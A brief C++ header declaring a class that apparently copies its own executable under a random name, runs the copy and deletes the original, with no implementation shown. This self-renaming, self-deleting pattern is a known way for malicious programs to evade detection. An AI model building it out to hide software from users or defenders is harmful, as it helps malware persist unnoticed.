#ifndef __RunExeByRandom_H
#define __RunExeByRandom_H

class RunExeByRandom
{
public:
	RunExeByRandom(LPCSTR lpszOringinName = NULL);
	bool Run();
protected:
	BOOL RandomCopySelf();
	void RunNewExe(LPCSTR lpszPath,LPCSTR lpszCmd);
	void DeleteOldExe(LPCSTR lpszPath);
private:
	std::string mRandName;
	std::string mOringinName;
};

#endif //__RunExeByRandom_H